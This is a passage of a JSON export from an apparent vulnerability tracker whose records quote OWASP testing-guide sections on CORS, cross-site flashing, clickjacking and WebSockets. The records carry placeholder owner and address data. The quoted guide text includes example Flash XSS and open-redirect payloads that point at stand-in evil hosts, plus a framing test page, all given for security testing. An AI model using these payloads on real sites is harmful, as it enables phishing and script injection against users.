past, the XHR L1 API only allowed requests to be sent within the same origin as it was restricted by the [Same Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) (SOP).\nCross-origin requests have an \u0060Origin\u0060 header that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use between a web browser and a server to determine whether a cross-origin request is allowed. HTTP [headers](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers) are used to accomplish this.\nThe [W3C CORS specification](https://www.w3.org/TR/cors/) mandates that for non simple requests, such as requests other than GET or POST or requests that uses credentials, a pre-flight OPTIONS request must be sent in advance to check if the type of request will have a bad impact on the data. The pre-flight request checks the methods and headers allowed by the server, and if credentials are permitted. Based on the result of the OPTIONS request, the browser decides whether the request is allowed or not.\n\n### Origin \u0026 Access-Control-Allow-Origin\n\nThe \u0060Origin\u0060 request header is always sent by the browser in a CORS request and indicates the origin of the request. The Origin header cannot be changed from JavaScript as [the browser (the user-agent) blocks its modification](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name); however, relying on this header for Access Control checks is not a good idea as it may be spoofed outside the browser, for example by using a proxy, so you still need to check that application-level protocols are used to protect sensitive data.\n\u0060Access-Control-Allow-Origin\u0060 is a response header used by a server to indicate which domains are allowed to read the response. Based on the CORS W3 Specification it is up to the client to determine and enforce the restriction of whether the client has access to the response data based on this header.\nFrom a security testing perspective you should look for insecure configurations as for example using a \u0060*\u0060 wildcard as value of the \u0060Access-Control-Allow-Origin\u0060 header that means all domains are allowed. Another insecure example is when the server returns back the origin header without any additional checks, which can lead to access of sensitive data. Note that the configuration of allowing cross-origin requests is very insecure and is not acceptable in general terms, except in the case of a public API that is intended to be accessible by everyone.\n\n### Access-Control-Request-Method \u0026 Access-Control-Allow-Method\n\nThe \u0060Access-Control-Request-Method\u0060 header is used when a browser performs a preflight OPTIONS request and lets the client indicate the request method of the final request. On the other hand, the \u0060Access-Control-Allow-Method\u0060 is a response header used by the server to describe the methods the clients are allowed to use.\n\n### Access-Control-Request-Headers \u0026 Access-Control-Allow-Headers\n\nThese two headers are used between the browser and the server to determine which headers can be used to perform a cross-origin request.\n\n### Access-Control-Allow-Credentials\n\nThis response header allows browsers to read the response when credentials are passed. When the header is sent, the web application must set an origin to the value of the \u0060Access-Control-Allow-Origin\u0060 header. The \u0060Access-Control-Allow-Credentials\u0060 header cannot be used along with the \u0060Access-Control-Allow-Origin\u0060 header whose value is the \u0060*\u0060 wildcard like the following:\n\n\u0060\u0060\u0060\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n\u0060\u0060\u0060\n\n### Input Validation\n\nXHR L2 introduces the possibility of creating a cross-domain request using the XHR API for backwards compatibility. This can introduce security vulnerabilities that in XHR L1 were not present. Interesting points of the code to exploit would be URLs that are passed to XMLHttpRequest without validation, specially if absolute URLs are allowed because that could lead to code injection. Likewise, other part of the application that can be exploited is if the response data is not escaped and we can control it by providing user-supplied input.\n\n### Other Headers\n\nThere are other headers involved like \u0060Access-Control-Max-Age\u0060 that determines the time a preflight request can be cached in the browser, or \u0060Access-Control-Expose-Headers\u0060 that indicates which headers are safe to expose to the API of a CORS API specification.\nTo review CORS headers, refer to the [CORS MDN document](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers).","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-08 Testing for Cross Site Flashing","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"ActionScript, based on ECMAScript, is the language used by Flash applications when dealing with interactive needs. There are three versions of the ActionScript language. ActionScript 1.0 and ActionScript 2.0 are very similar with ActionScript 2.0 being an extension of ActionScript 1.0. ActionScript 3.0, introduced with Flash Player 9, is a rewrite of the language to support object orientated design.\nActionScript, like every other language, has some implementation patterns which could lead to security issues. In particular, since Flash applications are often embedded in browsers, vulnerabilities like DOM-based Cross Site Scripting (DOM XSS) could be present in flawed Flash applications.\nCross-Site Flashing (XSF) is a vulnerability that has a similar impact to XSS.\nXSF occurs when the following scenarios are initiated from different domains:\n\n* One movie loads another movie with \u0060loadMovie*\u0060 functions (or other hacks) and has access to the same sandbox, or part of it.\n* An HTML page uses JavaScript to command an Adobe Flash movie, for example, by calling:\n    * \u0060GetVariable\u0060 to access Flash public and static objects from JavaScript as a string.\n    * \u0060SetVariable\u0060 to set a static or public Flash object to a new string value with JavaScript.\n* Unexpected communications between the browser and SWF application, which could result in stealing data from the SWF application.\n\nXSF may be performed by forcing a flawed SWF to load an external evil Flash file. This attack could result in XSS or in the modification of the GUI in order to fool a user to insert credentials on a fake Flash form. XSF could be used in the presence of Flash HTML Injection or external SWF files when \u0060loadMovie*\u0060 methods are used.\n\n### Open Redirectors\n\nSWFs have the capability to navigate the browser. If the SWF takes the destination in as a FlashVar, then the SWF may be used as an open redirector. An open redirector is any piece of website functionality on a trusted website that an attacker can use to redirect the end user to a malicious website. These are frequently used within phishing attacks. Similar to cross-site scripting, the attack involves a user clicking on a malicious link.\nIn the Flash case, the malicious URL might look like:\n\n\u0060\u0060\u0060\nhttp://trusted.example.org/trusted.swf?getURLValue=http://www.evil-spoofing-website.org/phishEndUsers.html\n\u0060\u0060\u0060\n\nIn the above example, an end user might see that the URL begins with their favorite trusted website and click on it. The link would load the trusted SWF which takes the \u0060getURLValue\u0060 and provides it to an ActionScript browser navigation call:\n\n\u0060\u0060\u0060\ngetURL(_root.getURLValue,\u0022_self\u0022);\n\u0060\u0060\u0060\n\nThis would navigate the browser to the malicious URL provided by the attacker. At this point, the phisher has successfully leveraged the trust the user has in trusted.example.org to trick the user into visiting their malicious website. From there, they could launch a 0-day, conduct spoofing of the original website, or any other type of attack. SWFs may unintentionally be acting as an open-redirector on the website.\nDevelopers should avoid taking full URLs as FlashVars. If they only plan to navigate within their own website, then they should use relative URLs or verify that the URL begins with a trusted domain and protocol.\n\n### Attacks and Flash Player Version\n\nSince May 2007, three new versions of Flash Player were released by Adobe. Every new version restricts some of the attacks previously described.\n\n| Player Version | \u0060asfunction\u0060 | ExternalInterface | GetURL | HTML Injection |\n| -------------- | ---------- | ----------------- | ------ | -------------- |\n| v9.0 r47/48 | Yes | Yes | Yes | Yes |\n| v9.0 r115 | No | Yes | Yes | Yes |\n| v9.0 r124 | No | Yes | Yes | Partially |\n","TestingInstructions":"## Test Objectives\n\n* Decompile and analyze the application\u2019s code.\n* Assess sinks inputs and unsafe method usages.\n\n## How to Test\n\nSince the first publication of [Testing Flash Applications](http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf), new versions of Flash Player were released in order to mitigate some of the attacks which will be described. Nevertheless, some issues still remain exploitable because they are the result of insecure programming practices.\n\n### Decompilation\n\nSince SWF files are interpreted by a virtual machine embedded in the player itself, they can be potentially decompiled and analyzed. The most known and free ActionScript 2.0 decompiler is flare.\nTo decompile a SWF file with flare just type:\n\u0060$\u00A0flare\u00A0hello.swf\u0060\nThis results in a new file called hello.flr.\nDecompilation helps testers because it allows for white-box testing of the Flash applications. A quick web search can lead you to various disassemblers and flash security tools.\n\n### Undefined Variables FlashVars\n\nFlashVars are the variables that the SWF developer planned on receiving from the web page. FlashVars are typically passed in from the Object or Embed tag within the HTML. For instance:\n\n\u0060\u0060\u0060\n\u003Cobject width=\u0022550\u0022 height=\u0022400\u0022 classid=\u0022clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\u0022\ncodebase=\u0022http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0\u0022\u003E\n    \u003Cparam name=\u0022movie\u0022 value=\u0022somefilename.swf\u0022\u003E\n    \u003Cparam name=\u0022FlashVars\u0022 value=\u0022var1=val1\u0026var2=val2\u0022\u003E\n    \u003Cembed src=\u0022somefilename.swf\u0022 width=\u0022550\u0022 height=\u0022400\u0022 FlashVars=\u0022var1=val1\u0026var2=val2\u0022\u003E\n\u003C/embed\u003E\n\u003C/object\u003E\n\u0060\u0060\u0060\n\nFlashVars can also be initialized from the URL:\n\u0060http://www.example.org/somefilename.swf?var1=val1\u0026var2=val2\u0060\nIn ActionScript 3.0, a developer must explicitly assign the FlashVar values to local variables. Typically, this looks like:\n\n\u0060\u0060\u0060\nvar paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;\nvar var1:String = String(paramObj[\u0022var1\u0022]);\nvar var2:String = String(paramObj[\u0022var2\u0022]);\n\u0060\u0060\u0060\n\nIn ActionScript 2.0, any uninitialized global variable is assumed to be a FlashVar. Global variables are those variables that are prepended by \u0060_root\u0060, \u0060_global\u0060 or \u0060_level0\u0060. This means that if an attribute like \u0060_root.varname\u0060 is undefined throughout the code flow, it could be overwritten by URL parameters:\n\u0060http://victim/file.swf?varname=value\u0060\nRegardless of whether you are looking at ActionScript 2.0 or ActionScript 3.0, FlashVars can be a vector of attack. Let\u2019s look at some ActionScript 2.0 code that is vulnerable:\nExample:\n\n\u0060\u0060\u0060\nmovieClip 328 __Packages.Locale {\n\n#initclip\n    if (!_global.Locale) {\n    var v1 = function (on_load) {\n        var v5 = new XML();\n        var v6 = this;\n        v5.onLoad = function (success) {\n        if (success) {\n            trace(\u0027Locale loaded xml\u0027);\n            var v3 = this.xliff.file.body.$trans_unit;\n            var v2 = 0;\n            while (v2 \u003C v3.length) {\n            Locale.strings[v3[v2]._resname] = v3[v2].source.__text;\n            \u002B\u002Bv2;\n            }\n            on_load();\n        } else {}\n        };\n        if (_root.language != undefined) {\n        Locale.DEFAULT_LANG = _root.language;\n        }\n        v5.load(Locale.DEFAULT_LANG \u002B \u0027/player_\u0027 \u002B\n                            Locale.DEFAULT_LANG \u002B \u0027.xml\u0027);\n    };\n\u0060\u0060\u0060\n\nThe above code could be attacked by requesting:\n\u0060http://victim/file.swf?language=http://evil.example.org/malicious.xml?\u0060\n\n### Unsafe Methods\n\nWhen an entry point is identified, the data it represents could be used by unsafe methods. If the data is not filtered or validated, it could lead to some vulnerabilities.\nUnsafe Methods since version r47 are:\n\n* \u0060loadVariables()\u0060\n* \u0060loadMovie()\u0060\n* \u0060getURL()\u0060\n* \u0060loadMovie()\u0060\n* \u0060loadMovieNum()\u0060\n* \u0060FScrollPane.loadScrollContent()\u0060\n* \u0060LoadVars.load\u0060\n* \u0060LoadVars.send\u0060\n* \u0060XML.load( \u0027url\u0027 )\u0060\n* \u0060LoadVars.load( \u0027url\u0027 )\u0060\n* \u0060Sound.loadSound( \u0027url\u0027 , isStreaming );\u0060\n* \u0060NetStream.play( \u0027url\u0027 );\u0060\n* \u0060flash.external.ExternalInterface.call(_root.callback)\u0060\n* \u0060htmlText\u0060\n\n### Exploitation by Reflected XSS\n\nThe swf file should be hosted on the victim\u2019s host, and the techniques of reflected XSS must be used. An attacker forces the browser to load a pure swf file directly in the location bar (by redirection or social engineering) or by loading it through an iframe from an evil page:\n\n\u0060\u0060\u0060\n\u003Ciframe src=\u0027http://victim/path/to/file.swf\u0027\u003E\u003C/iframe\u003E\n\u0060\u0060\u0060\n\nIn this situation, the browser will self-generate an HTML page as if it were hosted by the victim host.\n\n### GetURL (AS2) / NavigateToURL (AS3)\n\nThe GetURL function in ActionScript 2.0 and NavigateToURL in ActionScript 3.0 lets the movie load a URI into the browser\u2019s window. If an undefined variable is used as the first argument for getURL:\n\u0060getURL(_root.URI,\u0027_targetFrame\u0027);\u0060\nOr if a FlashVar is used as the parameter that is passed to a navigateToURL function:\n\n\u0060\u0060\u0060\nvar\u00A0request:URLRequest\u00A0=\u00A0new\u00A0URLRequest(FlashVarSuppliedURL);\nnavigateToURL(request);\n\u0060\u0060\u0060\n\nThen this will mean it\u2019s possible to call JavaScript in the same domain where the movie is hosted by requesting:\n\u0060http://victim/file.swf?URI=javascript:evilcode\u0060\n\u0060getURL(\u0027javascript:evilcode\u0027,\u0027_self\u0027);\u0060\nThe same is possible when only some part of \u0060getURL\u0060 is controlled via DOM injection with Flash JavaScript injection:\n\n\u0060\u0060\u0060\ngetUrl(\u0027javascript:function(\u0027\u002B_root.arg\u002B\u0027)\u0027)\n\u0060\u0060\u0060\n\n### Using \u0060asfunction\u0060\n\nYou can use the special \u0060asfunction\u0060 protocol to cause the link to execute an ActionScript function in a SWF file instead of opening a URL. Until release Flash Player 9 r48 \u0060asfunction\u0060 could be used on every method which has a URL as an argument. After that release, \u0060asfunction\u0060 was restricted to use within an HTML TextField.\nThis means that a tester could try to inject:\n\n\u0060\u0060\u0060\nasfunction:getURL,javascript:evilcode\n\u0060\u0060\u0060\n\nin every unsafe method, such as:\n\n\u0060\u0060\u0060\nloadMovie(_root.URL)\n\u0060\u0060\u0060\n\nby requesting:\n\u0060http://victim/file.swf?URL=asfunction:getURL,javascript:evilcode\u0060\n\n### ExternalInterface\n\n\u0060ExternalInterface.call\u0060 is a static method introduced by Adobe to improve player/browser interaction for both ActionScript 2.0 and ActionScript 3.0.\nFrom a security point of view it could be abused when part of its argument could be controlled:\n\n\u0060\u0060\u0060\nflash.external.ExternalInterface.call(_root.callback);\n\u0060\u0060\u0060\n\nthe attack pattern for this kind of flaw may be something like the following:\n\n\u0060\u0060\u0060\neval(evilcode)\n\u0060\u0060\u0060\n\nsince the internal JavaScript that is executed by the browser will be something similar to:\n\n\u0060\u0060\u0060\neval(\u0027try { __flash__toXML(\u0027\u002B__root.callback\u002B\u0027) ; } catch (e) { \u0022\u003Cundefined/\u003E\u0022; }\u0027)\n\u0060\u0060\u0060\n\n### HTML Injection\n\nTextField Objects can render minimal HTML by setting:\n\n\u0060\u0060\u0060\ntf.html = true\ntf.htmlText = \u0027\u003Ctag\u003Etext\u003C/tag\u003E\u0027\n\u0060\u0060\u0060\n\nSo if some part of text could be controlled by the tester, an \u0060\u003Ca\u003E\u0060 tag or an image tag could be injected resulting in modifying the GUI or a XSS attack on the browser.\nSome attack examples with \u0060\u003Ca\u003E\u0060 tag:\n\n* Direct XSS: \u0060\u003Ca href=\u0027javascript:alert(123)\u0027\u003E\u0060\n* Call a function: \u0060\u003Ca href=\u0027asfunction:function,arg\u0027\u003E\u0060\n* Call SWF public functions: \u0060\u003Ca href=\u0027asfunction:_root.obj.function, arg\u0027\u003E\u0060\n* Call native static as function: \u0060\u003Ca href=\u0027asfunction:System.Security.allowDomain,evilhost\u0027\u003E\u0060\n\nAn image tag could be used as well:\n\n\u0060\u0060\u0060\n\u003Cimg src=\u0027http://evil/evil.swf\u0027\u003E\n\u0060\u0060\u0060\n\nIn this example, \u0060.swf\u0060 is necessary to bypass the Flash Player internal filter:\n\n\u0060\u0060\u0060\n\u003Cimg src=\u0027javascript:evilcode//.swf\u0027\u003E\n\u0060\u0060\u0060\n\nSince the release of Flash Player 9.0.124.0, XSS is no longer exploitable, but GUI modification could still be accomplished.\nThe following tools may be helpful in working with SWF:\n\n* [OWASP SWFIntruder](https://wiki.owasp.org/index.php/Category:SWFIntruder)\n* [Decompiler \u2013 Flare](http://www.nowrap.de/flare.html)\n* [Disassembler \u2013 Flasm](http://flasm.sourceforge.net/)\n* [Swfmill \u2013 Convert Swf to XML and vice versa](https://www.swfmill.org/)\n\n1. \n\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-09 Testing for Clickjacking","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Clickjacking, a subset of UI redressing, is a malicious technique whereby a web user is deceived into interacting (in most cases by clicking) with something other than what the user believes they are interacting with. This type of attack, either alone or in conjunction with other attacks, could potentially send unauthorized commands or reveal confidential information while the victim is interacting with seemingly-harmless web pages. The term clickjacking was coined by Jeremiah Grossman and Robert Hansen in 2008.\nA clickjacking attack uses seemingly-harmless features of HTML and JavaScript to force the victim to perform undesired actions, such as clicking an invisible button that performs an unintended operation. This is a client-side security issue that affects a variety of browsers and platforms.\nTo carry out this attack, an attacker creates a seemingly-harmless web page that loads the target application through the use of an inline frame (concealed with CSS code). Once this is done, an attacker may induce the victim to interact with the web page by other means (through, for example, social engineering). Like other attacks, a common prerequisite is that the victim is authenticated against the attacker\u2019s target application.\n![Clickjacking illustration](Image Not Found)\n*Figure 4.11.9-1: Clickjacking inline frame illustration*\nThe victim surfs the attacker\u2019s web page with the intention of interacting with the visible user interface, but is inadvertently performing actions on the hidden web page. Using the hidden page, an attacker can deceive users into performing actions they never intended to perform through the positioning of the hidden elements in the web page.\n![Masked inline frame illustration](Image Not Found)\n*Figure 4.11.9-2: Masked inline frame illustration*\nThe power of this method is that the actions performed by the victim are originated from the hidden but authentic target web page. Consequently, some of the anti-CSRF protections deployed by the developers to protect the web page from CSRF attacks could be bypassed.","TestingInstructions":"## Test Objectives\n\n* Assess application vulnerability to clickjacking attacks.\n\n## How to Test\n\nAs mentioned above, this type of attack is often designed to allow an attacker to induce users\u2019 actions on the target site, even if anti-CSRF tokens are being used.\n\n### Load Target Web Page on a HTML Interpreter Using HTML iframe Tag\n\nSites that do not protected against frame busting are vulnerable to clickjacking attack. If the \u0060http://www.target.site\u0060 web page is successfully loaded into a frame, then the site is vulnerable to Clickjacking. An example of HTML code to create this testing web page is displayed in the following snippet:\n\n\u0060\u0060\u0060\n    \u003Chtml\u003E\n        \u003Chead\u003E\n            \u003Ctitle\u003EClickjack test web page\u003C/title\u003E\n        \u003C/head\u003E\n        \u003Cbody\u003E\n            \u003Ciframe src=\u0022http://www.target.site\u0022 width=\u0022400\u0022 height=\u0022400\u0022\u003E\u003C/iframe\u003E\n        \u003C/body\u003E\n    \u003C/html\u003E\n\u0060\u0060\u0060\n\n### Test Application against Disabled JavaScript\n\nSince these types of client-side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism against clickjacking.\nThere are few deactivation techniques that can be used with frames. More in depth techniques can be found on the [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).\n\n### Sandbox Attribute\n\nWith HTML5 a new attribute called \u201Csandbox\u201D is available. It enables a set of restrictions on content loaded into the iframe.\nExample:\n\n\u0060\u0060\u0060\n\u003Ciframe src=\u0022http://example.org\u0022 sandbox\u003E\u003C/iframe\u003E\n\u0060\u0060\u0060\n\n### Test Application on Compatibility and Accessibility Mode\n\nMobile versions of the web page are usually smaller and faster than the desktop ones, and they have to be less complex than the main application. Mobile variants often have less protection. However, an attacker can fake the real origin given by a web browser, and a non-mobile victim may be able to visit an application made for mobile users. This scenario could allow the attacker to exploit a mobile version of the web page. Applications running on acessibility mode should also be tested against clickjacking, because site framming could be affected.\n\n### Server-Side Protection: Using Frame-Ancestors Directive of Content Security Policy\n\nThe HTTP Content-Security-Policy (CSP) response header allows web page administrators to control resources the user agent is allowed to load for a given web page. The \u0060frame-ancestors\u0060 directive in the HTTP CSP specifies the acceptable parents that may embed a web page using the \u0060\u003Cframe\u003E\u0060, \u0060\u003Ciframe\u003E\u0060, \u0060\u003Cobject\u003E\u0060, \u0060\u003Cembed\u003E\u0060, or \u0060\u003Capplet\u003E\u0060 tags.\n\n#### Testing Content Security Policy Response Header\n\n* Using a browser, open developer tools and access the target web page. Navigate to the Network tab.\n* Look for the request that loads the web page. It should have the same domain as the web page - usually be the first item on the Network tab.\n* Once you click on the file, more information will come up. Look for a 200 OK response code.\n* Scroll down to the Response Header Section. Content-Security-Policy section indicates level of protecting adopted.\n\nAlternatively view the web page source to find Content-Security-Policy in a meta tag. WSTG has a detailed information on [Test for Content Security Policy](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy).\n\n##### Proxies\n\nWeb proxies are known for adding and stripping headers. In the case in which a web proxy strips the \u0060X-FRAME-OPTIONS\u0060 header then the site loses its framing protection.\n\n##### Mobile Version of the Application\n\nIn this case, because the \u0060X-FRAME-OPTIONS\u0060 HTTP header has to be implemented in every page of the application, developers may have not protected every single page on the mobile version.\n\n### ","Details":null,"Implication":null,"Recommendation":"* For measures to prevent Clickjacking, see the [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).\n* For interactive labs on Clickjacking visit [Port Swigger Web Page](https://portswigger.net/web-security/clickjacking)\n* For additional resources on ClickJacking visit the [OWASP community](https://owasp.org/www-community/attacks/Clickjacking)","References":"* [OWASP Clickjacking](https://owasp.org/www-community/attacks/Clickjacking)\n* [Wikipedia Clickjacking](https://en.wikipedia.org/wiki/Clickjacking)\n* [Gustav Rydstedt, Elie Bursztein, Dan Boneh, and Collin Jackson: \u201CBusting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites\u201D](https://seclab.stanford.edu/websec/framebusting/framebust.pdf)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-10 Testing WebSockets","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Traditionally, the HTTP protocol only allows one request/response per TCP connection. Asynchronous JavaScript and XML (AJAX) allows clients to send and receive data asynchronously (in the background without a page refresh) to the server, however, AJAX requires the client to initiate the requests and wait for the server responses (half-duplex).\n[WebSockets](https://html.spec.whatwg.org/multipage/web-sockets.html#network) allow the client or server to create a \u2018full-duplex\u2019 (two-way) communication channel, allowing the client and server to truly communicate asynchronously. WebSockets conduct their initial *upgrade* handshake over HTTP and from then on all communication is carried out over TCP channels by use of frames. For more, see the [WebSocket Protocol](https://tools.ietf.org/html/rfc6455).\n\n### Origin\n\nIt is the server\u2019s responsibility to verify the [\u0060Origin\u0060 header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) in the initial HTTP WebSocket handshake. If the server does not validate the origin header in the initial WebSocket handshake, the WebSocket server may accept connections from any origin. This could allow attackers to communicate with the WebSocket server cross-domain allowing for CSRF-like issues. See also [Top 10-2017 A5-Broken Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control).\n\n### Confidentiality and Integrity\n\nWebSockets can be used over unencrypted TCP or over encrypted TLS. To use unencrypted WebSockets the \u0060ws://\u0060 URI scheme is used (default port 80), to use encrypted (TLS) WebSockets the \u0060wss://\u0060 URI scheme is used (default port 443). See also [Top 10-2017 A3-Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure).\n\n### Input Sanitization\n\nAs with any data originating from untrusted sources, the data should be properly sanitized and encoded. See also [Top 10-2017 A1-Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection) and [Top 10-2017 A7-Cross-Site Scripting (XSS)](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)).","TestingInstructions":"## Test Objectives\n\n* Identify the usage of WebSockets.\n* Assess its implementation by using the same tests on normal HTTP channels.\n\n## How to Test\n\n### Black-Box Testing\n\n1. Identify that the application is using WebSockets.\n    * Inspect the client-side source code for the \u0060ws://\u0060 or \u0060wss://\u0060 URI scheme.\n    * Use Google Chrome\u2019s Developer Tools to view the Network WebSocket communication.\n    * Use [ZAP\u2019s](https://www.zaproxy.org/) WebSocket tab.\n2. Origin.\n    * Using a WebSocket client (one can be found in the Tools section below) attempt to connect to the remote WebSocket server. If a connection is established the server may not be checking the origin header of the WebSocket handshake.\n3. Confidentiality and Integrity.\n    * Check that the WebSocket connection is using TLS to transport sensitive information \u0060wss://\u0060.\n    * Check the HTTPS Implementation for security issues (Valid Certificate, BEAST, CRIME, RC4, etc). Refer to the [Testing for Weak Transport Layer Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) section of this guide.\n4. Authentication.\n    * WebSockets do not handle authentication, normal black-box authentication tests should be carried out. Refer to the [Authentication Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/README) sections of this guide.\n5. Authorization.\n    * WebSockets do not handle authorization, normal black-box authorization tests should be carried out. Refer to the [Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README) sections of this guide.\n6. Input Sanitization.\n    * Use [ZAP\u2019s](https://www.zaproxy.org/) WebSocket tab to replay and fuzz WebSocket request and responses. Refer to the [Testing for Data Validation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README) sections of this guide.\n\n#### Example 1\n\nOnce we have identified that the application is using WebSockets (as described above) we can use the [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/) to intercept the WebSocket request and responses. ZAP can then be used to replay and fuzz the WebSocket request/responses.\n![ZAP WebSockets](Image Not Found)\n*Figure 4.11.10-1: ZAP WebSockets*\n\n#### Example 2\n\nUsing a WebSocket client (one can be found in the Tools section below) attempt to connect to the remote WebSocket server. If the connection is allowed the WebSocket server may not be checking the WebSocket handshake\u2019s origin header. Attempt to replay requests previously intercepted to verify that cross-domain WebSocket communication is possible.\n![WebSocket Client](Image Not Found)\n*Figure 4.11.10-2: WebSocket Client*\n\n### Gray-Box Testing\n\nGray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. The only difference here is that you may have API documentation for the application being tested which includes the expected WebSocket request and responses.\n\n## Tools\n\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n* [WebSocket Client](https://github.com/ethicalhack3r/scripts/blob/master/WebSockets.html)\n* [Google Chrome Simple WebSocket Client](https://chrome.google.com/webstore/detail/simple-websocket-client/pfdhoblngboilpfeibdedpjgfnlcodoo?hl=en)","Details":null,"Implication":null,"Recommendation":null,"References":"* [HTML5 Rocks - Introducing WebSockets: Bringing Sockets to the Web](https://www.html5rocks.com/en/tutorials/websockets/basics/)\n* [W3C - The WebSocket API](https://html.spec.whatwg.org/multipage/web-sockets.html#network)\n* [IETF - The WebSocket Protocol](https://tools.ietf.org/html/rfc6455)\n* [Christian Schneider - Cross-Site WebSocket Hijacking 